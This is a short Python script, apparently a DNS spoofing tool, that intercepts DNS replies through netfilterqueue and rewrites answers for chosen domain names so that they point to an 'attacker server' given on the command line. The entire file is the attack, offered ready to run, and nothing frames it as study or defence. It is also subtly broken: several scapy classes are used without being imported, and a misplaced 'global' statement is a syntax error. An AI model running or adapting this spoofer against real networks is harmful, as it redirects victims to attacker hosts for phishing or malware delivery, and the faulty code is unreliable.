from scapy.all import IP
import argparse
import netfilterqueue

def modify_chksum_length(scapy_pkt):
	del scapy_pkt[IP].len
	del scapy_pkt[IP].chksum
	del scapy_pkt[UDP].len
	del scapy_pkt[UDP].chksum
	return scapy_pkt

def process_pkt(pkt):
	scapy_pkt = IP(pkt.get_payload())
	if scapy_pkt.haslayer(DNSRR):
		qname = scapy_pkt[DNSQR].qname
		for url in urls.split(','):
			if url in qname:
				answer = DNSRR(rrname=qname, rdata=attacker_server)
				scapy_pkt[DNS].ancount = 1
				scapy_pkt[DNS].an = answer

				scapy_pkt = modify_chksum_length(scapy_pkt)

				pkt.set_payload(str(scapy_pkt))
				break
	pkt.accept()

def nfqueue_bind():
	queue = netfilterqueue.NetfilterQueue()
	queue.bind(0, process_pkt)
	queue.run()

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('-s', '--server', help='Attacker Server')
	parser.add_argument('-u', '--urls', help='Urls to spoof. Use comma (,) to give multiple urls having no space between them')
	args = parser.parse_args()
	attacker_server = args.server
	urls = args.urls

	global attacker_server
	global urls

	nfqueue_bind()

if __name__ == '__main__':
	main()
